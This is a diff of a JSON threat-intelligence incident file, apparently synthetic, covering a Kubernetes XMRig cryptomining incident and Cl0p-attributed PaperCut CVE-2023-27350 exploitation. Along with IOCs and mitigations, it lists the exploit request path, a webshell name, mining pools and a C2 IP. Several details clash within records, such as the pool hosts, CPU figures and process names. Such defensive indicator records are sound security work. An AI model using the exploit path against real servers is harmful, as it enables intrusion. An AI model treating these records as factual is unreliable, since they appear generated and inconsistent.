+    "updated_at": "2026-06-08T12:31:09Z",
     "indicators": [
       "container_image:docker.io/xmrig/xmrig:latest",
       "pool:pool.hashvault.pro:443",
@@ -755,14 +3273,67 @@
       "process:xmrig",
       "cpu_spike:98_percent",
       "log:K8s-Unknown-Deployment-kube-system"
-    ]
+    ],
+    "confidence_score": 0.63,
+    "risk_score": 0.38,
+    "attribution_confidence": 0.48,
+    "suspected_actor": "UNKNOWN-CRIMINAL",
+    "attack_techniques": [
+      {
+        "technique_id": "T1496",
+        "technique_name": "Resource Hijacking",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1496"
+      },
+      {
+        "technique_id": "T1068",
+        "technique_name": "Exploitation for Privilege Escalation",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1068"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1046"
+      }
+    ],
+    "description": "Kubernetes cryptomining pod deployed via misconfigured RBAC. XMRig monero miner consuming 47% of cluster CPU. Likely opportunistic cloud threat actor.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "pod:xmrig-worker-7f4 [CRYPTOMINER_POD conf=0.95] | ip:pool.monero-xmr.net [MINING_POOL conf=0.97] | hash:v4w7x0... [XMRIG_HASH conf=0.92]",
+    "mitigation_actions": "Delete mining pods, harden RBAC, audit container registry, deploy falco runtime security",
+    "threat_summary": "K8s cryptomining resolved. RBAC tightened, Falco deployed for runtime protection.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": false,
+      "opportunistic": true
+    }
   },
   {
     "incident_id": "INC-2026-050",
     "threat_name": "PAPERCUT-CVE-2023-27350",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-CLOP-2026",
     "created_at": "2026-06-04T08:58:27Z",
+    "updated_at": "2026-06-07T08:58:27Z",
     "indicators": [
       "cve:CVE-2023-27350",
       "product:PaperCut-NG-22.0.9",
@@ -771,6 +3342,57 @@
       "url:GET /app?service=page/SetupCompleted",
       "webshell:print_rce.jsp",
       "process:java.exe"
-    ]
+    ],
+    "confidence_score": 0.82,
+    "risk_score": 0.75,
+    "attribution_confidence": 0.76,
+    "suspected_actor": "CLOP-TA505",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1046"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    ],
+    "description": "PaperCut CVE-2023-27350 actively exploited. Print server used as pivot to internal network. Cl0p-affiliated threat actor conducting reconnaissance via compromised print management server.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "vuln:CVE-2023-27350 [EXPLOITED_CVE conf=0.98] | ip:91.234.99.220 [C2_IP conf=0.89] | process:pc-ng-mgmt.exe [EXPLOITED_PROCESS conf=0.95]",
+    "mitigation_actions": "Patch PaperCut immediately, isolate print servers, audit internal pivot attempts, deploy network segmentation",
+    "threat_summary": "PaperCut exploitation mitigated. Print server pivoting disrupted, patch applied, network segmented.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 62
+    }
   }
 ]
